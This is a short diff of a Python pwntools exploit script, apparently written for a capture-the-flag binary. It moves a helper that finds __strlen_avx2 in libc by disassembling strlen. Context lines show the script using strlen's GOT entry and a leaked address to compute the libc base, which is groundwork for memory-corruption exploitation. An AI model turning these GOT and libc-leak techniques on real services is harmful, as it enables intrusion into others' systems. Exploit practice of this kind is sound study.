@@ -15,6 +15,15 @@ if len(sys.argv) > 1:
 if len(sys.argv) > 2:
 	PORT = sys.argv[2]
 
+def get_strlen_avx2(elf):
+	"""Start from strlen(), find the first address loaded into rdx which _should_ be __strlen_avx2()"""
+	strlen_offset = elf.symbols['strlen']
+	for line in elf.disasm(strlen_offset, 200).split('\n'):
+		line = ' '.join(line.split())
+		if 'lea rdx' in line:
+			return int(line.split(' # ', 1)[1], 16)
+	return False
+
 def add(io, name, desc, alias=''):
 	cmd = b'add'
 	if alias:
@@ -51,15 +60,6 @@ def exploit_attempt():
 		else:
 			io = target_elf.process(level='warn')
 			target_libc = target_elf.libc
-
-		def get_strlen_avx2(elf):
-			"""Start from strlen(), find the first address loaded into rdx which _should_ be __strlen_avx2()"""
-			strlen_offset = elf.symbols['strlen']
-			for line in elf.disasm(strlen_offset, 200).split('\n'):
-				line = ' '.join(line.split())
-				if 'lea rdx' in line:
-					return int(line.split(' # ', 1)[1], 16)
-			return False
 
 		GOT   = target_elf.symbols['got.strlen'] # the address of strlen in GOT
 		LIBC  = get_strlen_avx2(target_libc) # distance from __strlen_avx2() leak to libc base
